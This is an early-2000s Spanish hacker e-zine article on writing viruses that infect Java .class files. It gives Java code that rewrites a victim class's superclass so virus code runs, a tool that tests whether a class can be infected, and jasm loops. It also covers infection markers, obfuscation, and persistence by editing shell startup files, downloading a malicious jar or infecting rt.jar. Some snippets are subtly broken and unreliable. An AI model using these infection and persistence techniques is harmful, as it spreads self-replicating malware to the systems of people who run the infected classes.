@@ -1,0 +1,854 @@
+|-----------------------------------------------------------------------------|
+  [ 7a69#15 ]                                                  [ 23-11-2003 ]
+ \                                                                           /
+  \-------------------------------------------------------------------------/
+   { 8 - Infeccion de ficheros .class.                          }{ Pancake }
+   |-----------------------------------------------------------------------|
+
+
+
+
+Dicen que la guerra es de classes y no de pueblos...
+
+Y partiendo de este punto de vista me lie a infectar dichas classes... primero
+las bajas y las demas acabaran cayendo!
+
+El principal problema con el que nos encontramos a la hora de infectar una
+classe (estamos hablando de java) es la gran complejidad con las que nos
+encontramos en los header de la misma.
+
+Es decir, que solo tiene header. Un bytecode .class no tiene cuerpo, todo es
+cabeceara y ello representa el principal problema a la hora de la infeccion, ya
+que un virus deberia ser lo mas reducido posible, y tener que trabajar con una 
+cabecera tan compleja para poder encontrar/modificar/añadir codigo es una
+tarea realmente complicada.... vamos a ver las vmspec (http://java.sun.com).
+
+Las vmspec son un documento escrito por Sun Microsystems que explica como
+funciona una maquina virtual de java, y por lo tanto la estructura de un
+fichero .class, los bytecodes, etc. Muy interesante, por lo que os recomiendo
+la lectura a todos.
+
+Bien....
+
+[/tmp/vmspec]$ html2text ./ClassFile.doc.html -o /dev/tty | less
+ A class file consists of a single ClassFile structure:
+
+struct Class {
+    u4 magic;
+    u2 minor_version;
+    u2 major_version;
+    u2 constant_pool_count;
+    cp_info constant_pool[constant_pool_count-1];
+    u2 access_flags;
+    u2 this_class;
+    u2 super_class;
+    u2 interfaces_count;
+    u2 interfaces[interfaces_count];
+    u2 fields_count;
+    field_info fields[fields_count];
+    u2 methods_count;
+    method_info methods[methods_count];
+    u2 attributes_count;
+    attribute_info attributes[attributes_count];
+    };
+
+
+	Vamos a ver todo esto por partes... solo un poco por encima... si os 
+interesa profundizar ya sabeis (vmspecs r0lz ;)...
+
+	El primero define el tamaña de la parte de la derecha (u2 = 2 bytes),
+con el heditor (aka editor hexadecimal) podeis echar una ojo a estas partes, y
+enseguida vereis que se complican las cosas, porque los arrays de structs se
+van enlazando todas juntas y acaba siendo un fichero muy compacto. He hecho un
+programa en C que 'desmonta' todo un .class y facilita mucho el entendimiento
+de como funcionan este tipo de ficheros. Pero bien, antes una breve
+explicacion:
+
+ magic                 = 0xCaFeBaBe (4 bytes) Jeje... estos de sun son unos
+                         cachondos xD
+
+ minor/major_version   = La version minima y maxima requerida para ser
+                         interpretada por la maquina virtual.
+
+ constant_pool_count   = Cuantos elementos hay en el siguiente array.
+
+ cp_info c_p[]         = Array con las siguientes posibles structs:
+                          3 Utf8        { db  1; length: db 0,0; string: db ? }
+                          5 Integer     { db  3; value: db 0,0,0,0 }
+                          5 Float       { db  4; ""                }
+                          9 Long        { db  5; hB: db 0,0,0,0; lB: db 0,0,0,0 }
+                          9 Double      { db  6; ""            ; ""             }
+                          3 Class_info  { db  7; index: db 0,0 }
+                          3 String      { db  8; index: db 0,0 }
+                          5 FieldRef    { db  9; index: db 0,0; name: db 0,0 }
+                          5 MethodRef   { db 10; ""          ; "" }
+                          5 InterfaceRef{ db 11; ""          ; "" }
+                          5 Name&Info   { db 12; name: db 0,0; desc: db 0,0 }
+ 
+ access_flags         = PUBLIC, SUPER... (mira el codigo de readclass.c).
+
+ this_class           = puntero a la constant_pool que habla sobre esta classe.
+
+ super_class          = puntero a la constant_pool que habla de la classe 
+                        superior.
+
+ interface_count      = Contador de las interfaces que tiene el siguiente array.
+
+ fields[]             =
+                          2 access_flags
+                          2 name_index
+                          2 desc_index
+                          2 attr_count
+                          ? attr[]
+
+ methods_count        = Contador de los metodos que tiene el array siguiente.
+
+ methods[]            =
+                          2 access_flags
+                          2 name_index
+                          2 desc_index
+                          2 attr_count
+                          ? attr[]
+
+ attributes_count     = Cuantos atributos tiene el array siguiente.
+
+ attr[]               =
+                          2 attr_name_index
+                          4 length
+                          ? info[length]
+
+// attr_name_index apunta a un Utf8 del constant_pool que sale un string. 
+ "SourceFile"        { u2 name_index
+                       u4 length
+                       u2 source_index }
+ "ConstantValue"     { u2 name_index
+                       u4 length=2
+                       u2 value_index (type) }
+ "Code"              { u2 name_index
+                       u4 length
+                       u2 max_stack
+                       u2 max_locals
+                       u4 code_len.
+                       u1 code[];
+                       u2 exceptiontable[]{ u2 start_pc
+                                            u2 end_pc
+                                            u2 handler_pc;
+                                            u2 catch_type; }
+                       u2 attr_count
+                       u? attr[] }
+ "Exceptions"        { u2 name_index
+                       u4 attr_length
+                       u2 number_of_exceptions
+                       u2 exception_index_table[] } // a referencies a Class.
+ "InnerClasses"      { u2 name_index
+                       u4 attr_length
+                       u2 number_of_classes
+                       classes[] { u2 inner_class_info_index
+                                   u2 outer_class_info_index
+                                   u2 inner_name_index
+                                   u2 outer_name_index
+                                 }
+                      }
+ "Synthetic"          { u2 attribute_name_index
+                        u4 attribute_length }
+ "LineNumberTable"    { u2 attribute_name_index
+                        u4 attribute_length
+                        u2 line_number_table_length
+                        line_number_table[] { u2 start_pc
+                                              u2 line_number }
+                      }
+ "LocalVariableTable" { u2 attribute_name_index;
+                        u4 attribute_length;
+                        u2 local_variable_table_length;
+                        local_variable_table[]
+                             {
+                              u2 start_pc;
+                              u2 length;
+                              u2 name_index;
+                              u2 descriptor_index;
+                              u2 index;
+                             }
+                      }
+ "Deprecated"         { u2 attribute_name_index
+                        u4 attribute_length }
+
+
+NOTA: Perdonad por mezclar codigo en Java con codigo en C, pero es la mejor 
+      manera de expresarme. Teneis suerte de que no me haya dado por el Perl ;)
+
+
+	A la gente de Sun se les ha ido mucho la castaña definiendo un estándar
+tan bestia, pero asi es mas seguro.... o no :-?
+
+	Es decir, que la seguridad de la que tanto hablaba Sun sobre la
+imposibilidad (o la mucha dificultad) de que sea el objetivo de un virus se
+basa en la complejidad de la cabecera... ya que si os fijais, los puntos a los
+que nos interesa llegar estan en el penultimo array, osea, que no es la
+ultima, pero casi, y para encontrar donde estan definidos debes llegar alla.
+
+	En primer lugar deberemos ver las posibles vias de infeccion de un
+fichero .class. La primera, que es la cutre y simple, la podemos hacer
+nosotros a mano tranquilamente usando un editor hexadecimal siguiendo estos
+pasos:
+
+	- Creamos un virus.class con el virus.
+	- Cambiamos la classe superior (normalmente "java/lang/Object") por el
+	  nombre de la classe del virus, en este caso "virus" y escribimos el
+	  nombre de esta classe superior en la superior de virus.class.
+	- Guardar y ejecutar.
+
+	Hummm... No se si ha quedado demasiado claro. La idea esta en
+modificar las herencias de las classes metiendo la del virus en medio, de
+manera que cuando la maquina virtual llame al metodo <init> de cada una, se
+ejecutara el codigo malicioso de nuestra clase. Quiza os ayude a entenderlo un
+dibujo en ASCII, y si no es asi, me distraigo un poco xDD
+
+ .------------------.           .------------------.
+ | java/lang/Object |           | java/lang/Object |
+ `------------------'   __|\    `------------------'
+        \              |    \         \
+         \             |__  /      .------------.
+    .------------.        |/       | virus java |
+    |  hostatge  |                 `------------'
+    `------------'                        \
+                                      .---------------.
+                                      |    hostatge   |
+                                      `---------------'
+
+	Entonces para poder hacer esto debemos modificar la constant_pool y
+cambiar el string Utf8 que dice "java/lang/Object" por el nombre de la classe
+del virus, reduciendo el tamaño de la classe original para adaptar toda la
+escritura del .class
+
+
+---//---
+
+class extender
+{
+        public static void main(String a[])
+        {
+        if (a.length==2){
+        try {   byte b[]=new byte[(int)new File(a[0]).length()];
+                FileInputStream fi=new FileInputStream(a[0]);
+                fi.read(b);
+                int i=new String(b).indexOf("java/lang/Object");
+                System.arraycopy("\3"+a[1].getBytes(),0,b,i-1,4);
+                System.arraycopy(b,i+"java/lang/Object".length(),
+                              b,i+3,b.length-i-"java/lang/Object".length());
+                FileOutputStream fo=new FileOutputStream(a[0]);
+                fo.write(b);
+        } catch (Exception e){
+                System.out.println("Invalid target");
+        }}
+        } else {
+        System.out.println("Not enought parameters: usage ./xxx victim virus");
+        }
+}
+
+
+---//---
+
+
+	De esta manera con este programa podemos modificar la herencia de un
+programa haciendo que cuelgue de otra classe distinta a la classe por defecto
+(java/lang/Object *), asi, cuando se ejecute la classe victima llamara al
+metodo init (el constructor) de la classe superior, donde reside el codigo de
+nuestro virus. Se llamara tambien al metodo static de la clase superior. La
+diferencia entre estos dos metodos que se llaman es la siguiente:
+
+
+	* init: Se encuentra en un entorno no estatico (instanciado por la
+	        classe inferior), lo que nos permite jugar segun lo que
+		queramos hacer, ademas, este metodo se llama cuando se
+		instancia una classe o cuando se la llama.
+	
+
+	* static: Se encuentra en un entorno estatico bastante limitado y se
+	          ejecuta siempre que que se carga la classe, tanto si se
+		  llama como si es heredada.
+
+
+	Es exactamente aqui donde se encuentra la forma de diferenciar si una
+clase ha sido llamada inicialmente o heredada, asi, si el virus infecta de
+esta manera debera diferenciar con este metodo si se trata del virus original o
+si simplemente ha infectado una classe al ser heredado.
+
+
+---//---
+
+class jvx
+{
+  jvx   {
+        System.out.println("This class is infected");
+        }
+  static
+        {
+        // Nothing to say here.
+        }
+}
+
+---//---
+
+
+	El problema principal a la hora de infectar un .class es debido a la 
+complicacion del header .class que el virus debera hacer con una pila de
+trabajo para encontrar el punto a inyectar. Este el el primer metodo de
+infeccion, la mas sencilla de todas, puesto que las modificaciones son sencillas
+y rapidas, y ya deja los .class marcados, pues cuando no se heredan
+"java/lang/object" ya no los infecta.
+
+
+
+Marcas de infeccion
+-------------------
+
+	Para marcar un .class como infectado podemos aumentar el tamaño de la
+classe y al final añadir una firma. Si no queremos aumentar el tamaño de la
+misma podemos alterar algunos bytes de la classe que no sean decisivos en la
+ejecucion; minor-version, por ejemplo.
+
+
+
+Porque programar con bytecodes? (javaASM)
+-----------------------------------------
+
+	Es complicado encontrar alguna razon practica a la programacion en
+java assembly, pues es mucho mas complicado que cualquier ensamblador, pues al
+estar orientado a objetos puede llegar a marear un poco. Sin embargo podemos
+encontrarle algunas ventajas:
+
+	- Entenderemos como funciona internamente la VM.
+
+	- Es mucho mas c00l xD
+
+	- Se puede llegar a optimizar mas el codigo
+
+	- Es posible ofuscar el codigo
+
+	- Podemos hacer funciones dentro de un solo metodo, asi es mas facil
+	  organizar el codigo virico para inyectarlo en una .class
+
+
+
+Ofuscando el codigo
+-------------------
+	
+	La ofuscacion de codigo en java es un tema bastante "sencillo" pero
+complejo al mismo tiempo, es decir, tenemos que tener claro que nunca nos sera
+posible saltarnos un sistema de desensamblado a no ser que utilicemos algun
+sistema de self-modifying, es decir abriendo la misma classe ejecutada,
+modificandola y cargandola de nuevo dejando un unico metodo "visible" y el
+resto cifrados, siendo el metodo visible el que llamara al resto.
+
+	Debido a que muy poca gente utiliza el desensamblado de bytecodes a la
+hora de analizarlos, podemos intentar mearnos en este tipo de seguridad usando
+una tecnica llamada "HoseMocha" del año 1997 y que aun sigue funcionando en
+algunos decompiladores (no en desensambladores), que consiste en poner un
+"pop" antes de cada "ret", asi que ir poniendo un poco de imaginacion.
+
+	Para aprender a programar en javaASM, lo mejor (para mi) es utilizar
+jikes como compilador y jasper como decompilador (por desgracia, a pesar de que
+es soft libre necesita trabajar sobre la VM de sun que no lo es).
+
+
+
+
+Infectando los metodos
+----------------------
+	logicamente la infeccion de classes mediante la herencia es una forma
+sencilla y rapida, sin embargo muy cantona, pues despierta sospechas
+encontrarse otra classe por ahi.
+
+	Asi que la forma 'bonita' es hacer que el virus se incluya en el
+interior de algun metodo ya existente de la classe (o añadir un metodo mas en
+la classe, pero esto ya seria liarlo demasiado, ya que es mucho mas complicado
+y llama mas la atencion). Para ello usaremos una classe victima que sera
+infectada por otra modificando el metodo main para que escriba una frase, es
+decir, el mismo ejemplo de arriba pero con este otro tipo de infeccion.
+
+	Se debera modificar la constante constant_pool aÃ±adiendola todo lo que
+necesite nuestra classe, para ello deberemos buscar el final de constrant_pool
+y colocar la nuestra, para luego aumentar el contador constant_pool. No nos
+quitemos de la cabeza que esto es un virus, y debe programarse bien, y lo
+jodido del java es que complica demasiado los .class y debemos buscar sistemas
+muy bestias para poder llegar al field que nos interesa... a ver que os
+parece.
+
+	Hacemos la classe hostage:
+
+
+---//---
+
+class host
+{
+	public static void main ( String a[] )
+	{
+		System.out.println("hostage message");
+	}
+}
+
+;--[ jasm code ]--
+  Con el readclass (el programilla que he hecho y que debe ir adjunto al
+  texto) podemos leer toda la constant_pool:
+;--
+Constants in pool : 28
+  1 : MethodRef - classindex:6 nameindex:15
+  2 : FieldRef - classindex:16 nameindex:17
+  3 : String - index 18
+  4 : MethodRef - classindex:19 nameindex:20
+  5 : Class - index 21
+  6 : Class - index 22
+  7 : Utf8  - "<init>" - length : 6
+  8 : Utf8  - "()V" - length : 3
+  9 : Utf8  - "Code" - length : 4
+ 10 : Utf8  - "LineNumberTable" - length : 15
+ 11 : Utf8  - "main" - length : 4
+ 12 : Utf8  - "([Ljava/lang/String;)V" - length : 22
+ 13 : Utf8  - "SourceFile" - length : 10
+ 14 : Utf8  - "host.java" - length : 9
+ 15 : NameAndType - name-index:7 descriptor-index:8
+ 16 : Class - index 23
+ 17 : NameAndType - name-index:24 descriptor-index:25
+ 18 : Utf8  - "hostage message" - length : 15
+ 19 : Class - index 26
+ 20 : NameAndType - name-index:27 descriptor-index:28
+ 21 : Utf8  - "host" - length : 4
+ 22 : Utf8  - "java/lang/Object" - length : 16
+ 23 : Utf8  - "java/lang/System" - length : 16
+ 24 : Utf8  - "out" - length : 3
+ 25 : Utf8  - "Ljava/io/PrintStream;" - length : 21
+ 26 : Utf8  - "java/io/PrintStream" - length : 19
+ 27 : Utf8  - "println" - length : 7
+ 28 : Utf8  - "(Ljava/lang/String;)V" - length : 21
+
+  <method main>
+        getstatic #2
+        ldc #3
+        invokevirtual #4
+        return
+  </method main>
+
+;//--
+
+---//---
+
+
+	Aqui podemos ver algunas cosas claras, y es que el codido depende del 
+indice de la constant_pool, y esto es muuuuuy chungo, pues si añadimos la
+constant_pool a continuacion de la existente sera necesario que esta este
+adaptada a la nueva posicion, es decir que si esta classe tiene 28 metodos,
+sera necesario que todas las referencias a estas esten con +=28 para que
+apunten al lugar correcto, y ademas el codigo que copiemos en el interior del
+metodo tambien debera aumentar con +=28 todas las referencias a la
+constant_pool. Un metodo para mantener el codigo servible es añadiendo la
+.class padre al final del class, de esta manera el virus siempre podra partir
+de la classe original e ir creando hilos, lo que costaria, incluso, menos 
+trabajo al proceso. Es decir:
+
+	[hostage] -> [hostage]
+	             [ virus ]
+
+	
+	La classe sigue siendo funcional, sin embargo se le ha adjuntado mas
+codigo de lo que necesitaba sin que la VM se percate de nada, pues simplemente
+se dedicara a seguir la estructura del codigo.
+
+	El siguiente paso consistiria en infectar alguno de los metodos (es
+necesario conocer si estamos en un entorno estatico o no, y si nuestro virus
+necesitara o no un entorno estatico para funcionar). Generalmente intentaremos
+que el codigo funcione sobre un entorno estatico, pues asi sera mucho mas
+facil hacerlo correr e infectar un mayor numero de classes. Asi que iremos a
+atacar los metodos main y static, aunque tambien podriamos buscar un metodo
+constructor para trabajar en un entorno no-estatico... Una forma muy sencilla
+de infectar una classe es añadiendo el metodo static (.mthod static
+<clinit>()V), pues practicamente ninguna classe lo utiliza y es un metodo que
+se ejecuta SIEMPRE antes que cualquier otro.
+
+	Vamos a ver como podemos encontrar el final de la constant_pool de
+forma rapida...
+
+
+---/ findeoc.java /---
+
+import java.io.*;
+
+class findeoc
+{
+public static void main(String a[])
+{
+try {
+        byte b[]=new byte[(int)new File(a[0]).length()];
+        System.out.println("Find End Of Constant_pool");
+        FileInputStream fi=new FileInputStream(a[0]);
+        fi.read(b);
+
+        int constant_pool=--b[9];
+        System.out.println("JowMeni : "+constant_pool+"\n;--");
+
+        byte cp[]={0,3,1,5,5,9,9,3,3,5,5,5,5};
+        int p=10; // pointer to data
+        for (;0<constant_pool--;)
+        {
+                int i=0;
+                System.out.print(b[p]+".");
+                for (;((i<13)&&(b[p]!=i));i++);
+                if (i==1) p+=b[p+2]; p+=(byte)cp[i];
+        }
+        System.out.println("\n;--\nEnd Of CP == "+p);
+        System.gc(); // netegem la brosa
+
+        try {
+        if ((0<b[p+7])||(b[p+9]>0)) throw new Exception();
+        p+=11;
+        } catch (Exception e) {
+        System.out.println("Unable to infect this class (have ifaces/fields)");
+        }
+        System.out.println("Methods: "+b[p]+" @ position "+
+                p+" ("+Long.toHexString(p)+").");
+
+
+
+} catch (Exception e){ System.out.println("catched!"); }
+}
+}
+
+---/ findeoc.java /---
+
+	
+	Ahora veamos como podemos currarnos el bucle en java assembler.
+
+
+---//---
+
+gen_array:
+        bipush 13      ;
+        newarray byte  ; creamos un array de 13 elementos.
+        astore_2       ; local[2]=new array byte[13]
+        dup            ; push del array
+        iconst_0       ; valor
+        iconst_0       ; posicion del array
+        bastore        ; Lo grabamos como byte (llenar de bytes).
+bucle: 
+        bipush 10      ; 10 elememntos a la cp. (es necesario cojerlo del .class).
+        astore 4       ; se guarda enlocal[4]
+        iload 4
+        bipush 0
+        if_icmpeq fi
+        iinc 4 1       ; local[4]++
+bucle_cp:
+        iconst_0
+        astore 5       ; variable local[5] = 0 ; apuntador al array cp.
+        iload 5        ; fin de bucle?
+        bipush 13      ; 13=limit bucle.
+        iinc 5 1       ; local[5]++;
+        if_icmpeq bucle
+        ; Añadir el codigo para encontrar el final de la constant_pool..
+        goto bucle_cp
+
+fi:
+        getstatic java/lang/System/out Ljava/io/PrintStream;
+        ldc "Bucle acabat"
+        invokevirtual java/io/PrintStream/println(Ljava/lang/String;)V
+
+---//---
+
+
+	Bien, asi nos acostumamos todos un poco al funcionamiento del jasm 
+este ;)
+
+
+
+
+Solucion del problema base
+--------------------------
+
+	El problema base consiste en el classico 'delta offset' de los virus
+convencionales, es decir, en un virus normal uno de los problemas es conocer
+la posicion de la memoria en la que se encuentra para poder acceder a sus
+propios datos (el tipico call $+4 ; pop %ebp). Esto en jasm no ocurre, pues
+las variables y el codigo estan separadas, y si, por ejemplo, nosotros hacemos
+referencia a la variable 1 es posible que esta ya este ocupada por la classe a
+infectar, y no podemos machacarla porque acabaria petando todo. Lo que debemos
+hacer es conocer la longitud de la constant_pool y cuando infectamos la class
+incrementar el valor de los bytes afectados, es decir, que usen la CP. Para
+hacer esto es necesario currsarse un programa antes de hacer el virus que
+calcule la posicion exacta de cada byte conflictivo, conociendo el trabajo que
+supone hacer eso prefiero hacerlo manualmente usando un editor hexadecimal
+(vche :**), con las vmspec a mano e ir buscando los opcodes afectados y hacer
+un listado, para que el virus pueda tenerlo en cuenta y aumentar el valor de
+estos en relacion al nombre de elementos que tenga esta classe en la
+constant_pool.
+
+	(Leer dos o tres veces esto, porque no se explicarme mejor)
+
+	Espero que haya quedado mas o menos claro, sin embargo intentare
+aclararlo mas con un dibujo de los mios:
+
+hostatge:
+ [----------]
+ [    cp    ] ; tienee 30 elementos
+ [----------]
+ [  method  ] ; getstatic #3
+ [----------]
+
+virus:
+ [----------]
+ [    cp    ] ; tiene 5 elementos
+ [----------]
+ [  method  ] ; getstatic #3
+ [----------]
+
+	En este caso el virus petara en la ejecucion, pues el acceso al elemento 
+3 de la CP no es el mismo en el host que en el virus, por lo que sera necesario
+hacer lo siguiente en la infeccion:
+
+host+virus:
+ [-----------]
+ [  cp_host  ] ; 30 elementos
+ [  cp_vrx   ] ; 5 elementos
+ [-----------]
+ [ meth_host ]
+ [ meth_vrx  ] ; ---> En el momento de copiar conforme a una lista sera necesario
+ [-----------] ;      aumentar el valor de cada llamada la cp en 30.
+
+	El listado siguiente contiene todos los opcodes que una la constant_pool, 
+asi sera mas sencillo encontrar esos bytes conflictivos :)
+
+.- opkode ---------.- hex - next bytes -.
+|                  |                    |
+| anewarray        .   BD       2       |
+| checkcast        ;   C0       2       |
+| getfield         :   B4       2       |
+| getstatic        :   B2       2       |
+| instanceof       |   C1       2       |
+| invokeinterface  .   B9       2       |
+| invokespecial    .   B7       2       |
+| invokestatic     .   B8       2       |
+| invokevirtual    .   B6       2       |
+| ldc              |   12       1       |
+| ldc_w            :   13       2       |
+| ldc2_w           .   14       2       |
+| multinewarray    |   C5       2       |
+| new              .   BB       2       |
+| putfield         |   B5       2       |
+| putstatic        :   B3       2       |
+`---------------------------------------'
+
+	Vamos a ver un pequeño ejemplo sobre como iria todo esto... ya que las 
+referencias a la CP no solo estan dentro del codigo, sino que tambien en las 
+cabeceras de los metodos.
+
+method:
+     flags db 00 09  ; public(1) + static(8)
+     name  db 00 03  ; Su nombre esta en una Utf8 dentro de la CP
+     desc  db 00 04  ; apuntador a un Utf8
+     attr  db 00 00  ; Ningun atributo rules!
+     attr[]          ; Pues eso, ningun atributo
+
+
+	El principal problema es que los compiladores de codigo jasm estan muy
+limitados, es decir que automatizan demasiadas tareas y dificultan todo este
+trabajo de hacer un virus, por lo que es necesario hacer uso de otros
+programas externos y elaborar el virus de forma artificial. Es muy dificil
+lograr que un virus sea capaz de vivir solo en la primera generacion, sino que
+es necesario modificar el codigo hasta conseguir la forma adecuada. Si tengo
+tiempo me currare un ensamblador de jasm que permita la programacion de virus,
+id mirando a http://pancake.host.sk.
+
+
+
+Premanencia en el sistema
+-------------------------
+
+	El principal objetivo de cualquier virus, es el de poderse mantener en
+"background" esperando a la victima para saltarle encima e infectarla. En java
+la estancia en background no es como en el resto de los virus, ya que no se
+puede dejar una VM corriendo detras, ya que cantaria demasiado y ademas no
+seria capaz de detectar en que momento va a ejecutarse otra classe, ya que son
+maquinas virtuales distintas (a no ser que el sistema corra en javaOS en un
+sistema hotspot), lo que limita la permanencia a un solo punto:
+
+	EL CLASSPATH!! Este debe ser infectado, sea como sea, pues si
+conseguimos hacer una clase que sustituya la classe "File", por ejemplo,
+podremos capturar cuando se vaya a abrir un fichero, o buscar cuando se carga
+otra classe, etc. Para ello se me han ocurrido dos formas de hacerlo.
+
+	1) simple cutre:
+	
+	Consiste en detectar el OS en el que se esta ejecutando la VM (para
+ello revisad la API :) y una ves hecho, ir al $home del usuario y modificar el 
+.bashrc (por ejemplo) o el autoexec.bat o el registro, etc. Descargar un .jar 
+con el codigo malicioso que lleve como mochila el virus sobre el directorio 
+del ClassPath y mofidicar el classpath para que apunte a ese .jar.  
+Logicamente, esto es facilmente detectable.
+
+	2) Hacker chunga:
+
+	Consiste en hacer el trabajo bien hecho: abrir el rt.jar (Klasses.jar)
+dependiendo de la VM, buscar el .class objetivo, descomprimirlo, infectarlo y 
+volverlo a colocar dentro. Para hacer esto tenemos las preciosas classes 
+(java/util/jar) que nos pueden ayudar bastante.
+
+	Vamos a jugar un poco con esta...
+
+---//---
+
+mport java.io.*;
+import java.util.zip.*;
+
+class extractor
+{
+public static void main(String a[])
+        {
+        System.out.println("Classpath : \""+
+             System.getProperty("java.class.path") +"\"");
+        if (a.length<2) {
+        System.out.println("Usage : me [jarfile] [classtoextract]");
+        }
+        try {
+        ZipFile zf = new ZipFile(a[0]); // abrimos el fichero argv[0];
+        if (zf==null) { System.out.println("grrr, ixo no es!");
+                        System.exit(1); }
+        ZipEntry ze = zf.getEntry(a[1]);
+        InputStream is = zf.getInputStream(ze);
+        FileWriter file=new FileWriter("extracted.class");
+        int x; while((x=is.read())!=-1) file.write(x);
+        file.close();
+        } catch(Exception e) {
+        System.out.println("Error ocurred :/");
+        }
+        }
+}
+
+---//---
+
+
+[/tmp]# java extractor
+Classpath "."
+Usage : me [jarfile] [classtoextract]
+Error ocurred :/
+
+#<!-- Bien, yo tengo el classpath protegido con un shellscript (-classpath .)
+#<!-- pero normalmente da el classpath correcto ;))
+
+[/tmp]# cp /usr/local/j2sdk1.4.0_01/jre/lib/rt.jar ./
+
+#<!-- ok, copiamos el classpath al /tmp
+
+[/tmp]# java extractor rt.jar java/io/File.class
+Classpath "."
+[/tmp]#
+
+[/tmp]# ls -l extracted.class
+-rw-r--r--    1 root     root        10522 Oct 16 14:50 extracted.class
+[/tmp]# readclass extracted.class |grep "()Ljava/io/File"
+171 : Utf8  - "()Ljava/io/File;" - length : 16
+
+#!<-- Yepala! Hemos extraido la classe java/io/File de dentro del jar. Ahora
+#!<-- la podemos modificar y volver a inyectar dentro del .jar
+
+	La forma de infectar un jar (== zip) es primero extraer la classe que
+queremos, borrar la entrada dentro del jar, i despues escribir una entrada
+nueva con el nuevo fichero, pero para hacer todo esto no hay classes en java,
+asi que debemos trabajarnoslo :P Si os interesa mirad este enlace que os
+pongo:  http://www.javaworld.com/javaworld/jw-07-2000/jw-0728-toolbox.html
+
+
+
+
+Carga dinamica de classes
+-------------------------
+	Si nos encontramos limitados y queremos hacer cosas bien hechas, es
+interesante cargar dinamicamente las classes que el virus usara para
+funcionar, ya que incluirlas directamente canta demasiado, ademas de ser poco
+decente que estas esten todo el rato en memoria. Con la carga dinamica podemos
+llamar a metodos de otras classes, es como una especie de dlopen(), pero en
+version java. El codigo que he escrito funciona de dos formas distintas:
+	
+	1) Carga todos los metodos de la classe importada.
+
+	2) Carga un unico metodo de la classe importada.
+
+
+	Si nos fijamos en el constructor, inicializador y destructores no los
+consideramos metodos.... mirad la ejecucion:
+
+
+[/tmp]# java nyu
+Metodes: 2
+ [0] - main
+ [1] - draw
+Method called from dynamic loading.
+
+
+	Mirad el codigo a ver que os parece, yo creo que queda bastante claro :)
+
+	Por cierto, me he dado cuenta que solo podemos llamar a metodos estaticos, 
+ya que si no salta una exepcion y no se deja, pero lo solucionamos definiendo
+todos los metodos como estaticos y punto.
+
+	Ale pop!
+
+
+---/ nyu.java /---
+
+import java.lang.reflect.Method;
+
+class nyu
+{
+nyu()
+{
+   Class[] type=new Class[0];  // array buida
+   Object[] parm=new Object[0]; // ""    ""
+
+   try {
+        Class s=Class.forName("nyu");  // importem la classe nyu.class
+        Method x[];
+        Method caller;
+        caller=s.getDeclaredMethod("draw",type); // agafem el metode
+        x=s.getDeclaredMethods();                // els agafem tots.
+        System.out.println("Metodes: "+x.length); // quants en te?
+        for(int i=0;i<x.length;i++)
+        {
+                System.out.println(" ["+i+"] - "+x[i].getName()); // quins?
+        }
+        x[1].invoke((Object)x[1],parm);  // invokenonvirtual opcode
+   } catch(Exception e) {
+        System.out.println(e);
+        System.out.println("Exception catched...catch'm all! (pokemon) xD");
+   }
+}
+
+public static void main(String a[])
+        {
+        new nyu();
+        }
+
+static void draw()
+        {
+        System.out.println("Method called from dynamic loading.");
+        }
+}
+
+---/ nyu.java /---
+
+
+
+Agradecimientos
+---------------
+	Bien, espero que os haya gustado este articulillo sobre virus, 
+pues hacia ya bastante tiempo que no me metia con temas viricos y es posible
+que ahora me vuelva a meter. Si os interesa el tema, teneis dudas o para
+cualquier cosa podeis hacermelos llegar a pancake@phreaker.net que intentare
+responder lo mas rapidamente posible. Por cierto, si haceis cualquier cosa
+sobre el tema, pues no conozco a nadie que haya trabajado con jasm y me
+gustaria poder compartir conocimientos sobre el tema :)
+
+PD: No se si mirarme lo de C#, siendo de M$.... xD
+
+
+
+	Breaking the cup...of java
+
+
+*EOF*
